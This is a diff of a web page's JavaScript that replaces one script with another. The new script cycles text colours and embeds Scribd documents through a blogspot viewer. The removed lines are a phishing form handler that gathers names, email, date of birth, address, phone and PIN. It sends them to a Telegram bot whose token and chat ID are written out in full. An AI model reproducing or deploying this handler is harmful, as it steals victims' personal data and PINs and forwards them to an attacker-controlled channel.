@@ -1,61 +1,99 @@
-document.getElementById("personal-info-form").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent form submission
+ var spans = document.querySelectorAll(".color-change");
+        var currentIndex = 0;
+        var colors = ["#ab006b", "#6b00ab", "#ab6b00"];
 
-    // Get the entered personal info values
-    var firstName = document.getElementById("first-name").value;
-    var lastName = document.getElementById("last-name").value;
-    var email = document.getElementById("email").value;
-    var dob = document.getElementById("dob").value;
-    var address = document.getElementById("address").value;
-    var phone = document.getElementById("phone").value;
-    var pin = document.getElementById("pin").value;
-
-    // Create an HTTP request object
-    var xhr = new XMLHttpRequest();
-
-    // Prepare the request
-    xhr.open("POST", "/submit-personal-info", true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-
-    // Handle the response
-    xhr.onload = function() {
-        if (xhr.status === 200) {
-            alert("Personal info submitted successfully!");
-        } else {
-            alert("Failed to submit personal info. Please try again.");
+        function changeColor() {
+            spans[currentIndex].style.color = colors[currentIndex];
+            spans.forEach((span, index) => {
+                if (index !== currentIndex) {
+                    span.style.color = "rgb(0, 0, 0)";
+                }
+            });
+            currentIndex = (currentIndex + 1) % colors.length;
         }
-    };
 
-    // Send the request with the personal info as JSON data
-    var data = JSON.stringify({
-        firstName: firstName,
-        lastName: lastName,
-        email: email,
-        dob: dob,
-        address: address,
-        phone: phone,
-        pin: pin
-    });
-    xhr.send(data);
+        setInterval(changeColor, 2000);
 
-    // Send the personal info to the Telegram bot
-    var telegramBotToken = "6898105800:AAGhdS8vnzZlxPMBB7SF2y7B3-5Bxw-AJws";
-    var chatId = "5857533644";
-    var telegramUrl = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
-    var telegramData = {
-        chat_id: chatId,
-        text: "First Name: " + firstName + "\nLast Name: " + lastName + "\nEmail: " + email + "\nDOB: " + dob + "\nAddress: " + address + "\nPhone: " + phone + "\nPin: " + pin
-    };
+// Function to parse document number and title from the current URL
+  function parseURLParameters() {
+    const params = new URLSearchParams(window.location.search);
 
-    fetch(telegramUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(telegramData)
-    }).then(function(response) {
-        console.log("Telegram message sent!");
-    }).catch(function(error) {
-        console.error("Error sending Telegram message: ", error);
-    });
-});
+    if (params.has('doc') && params.has('title')) {
+      const documentNumber = params.get('doc');
+      const pageTitle = params.get('title');
+
+      // Update the input field with the title
+      const inputLink = `https://www.scribd.com/document/${documentNumber}/${pageTitle}`;
+      document.getElementById('scribdLink').value = inputLink;
+
+      // Update the page title without hyphens
+      const cleanTitle = pageTitle.replace(/-/g, ' ');
+      document.getElementById('pageTitle').textContent = cleanTitle;
+
+      // Update the iframe source
+      const iframe = document.getElementById('scribdIframe');
+      iframe.src = `https://www.scribd.com/embeds/${documentNumber}/content`;
+
+      // Display the iframe container since the iframe source is set
+      document.getElementById('iframeContainer').style.display = 'block';
+    }
+  }
+
+  // Handle the "Change Link" button click event
+  document.getElementById('changeLink').addEventListener('click', () => {
+    const inputLink = document.getElementById('scribdLink').value;
+    
+    if (isValidScribdLink(inputLink)) {
+      // Valid Scribd link format
+      updateIframeAndWebsiteLink(inputLink);
+
+      // Update the browser's address bar with the new URL
+      const { documentNumber, pageTitle } = parseScribdLink(inputLink);
+      const myWebsiteLink = `https://scribdvpdf.blogspot.com/?doc=${documentNumber}&title=${pageTitle}`;
+      window.history.pushState({}, null, myWebsiteLink); // Update URL without refreshing the page
+    } else {
+      // Invalid link format or empty input
+      displayErrorMessage("This type of doc is not supported or please enter a valid Scribd link.");
+    }
+  });
+
+  // Function to check if the input is a valid Scribd link
+  function isValidScribdLink(inputLink) {
+    // Regular expression to match the expected Scribd link format
+    const scribdLinkPattern = /^https:\/\/www\.scribd\.com\/document\/\d+\/[\w-]+$/;
+    return scribdLinkPattern.test(inputLink);
+  }
+
+  // Function to display an error message
+  function displayErrorMessage(message) {
+    const errorMessageDiv = document.getElementById('errorMessage');
+    errorMessageDiv.textContent = message;
+    errorMessageDiv.style.display = 'block';
+  }
+
+  // Function to parse document number and title from the Scribd link
+  function parseScribdLink(inputLink) {
+    const parts = inputLink.split('/');
+    const documentNumber = parts[parts.length - 2];
+    const pageTitle = parts[parts.length - 1];
+    return { documentNumber, pageTitle };
+  }
+
+  // Function to update the iframe source and custom website link
+  function updateIframeAndWebsiteLink(inputLink) {
+    const { documentNumber, pageTitle } = parseScribdLink(inputLink);
+
+    // Update the iframe source
+    const iframe = document.getElementById('scribdIframe');
+    iframe.src = `https://www.scribd.com/embeds/${documentNumber}/content`;
+
+    // Update the page title without hyphens
+    const cleanTitle = pageTitle.replace(/-/g, ' ');
+    document.getElementById('pageTitle').textContent = cleanTitle;
+
+    // Display the iframe container since the iframe source is set
+    document.getElementById('iframeContainer').style.display = 'block';
+  }
+
+  // Call the function to parse the URL parameters on page load
+  window.onload = parseURLParameters;
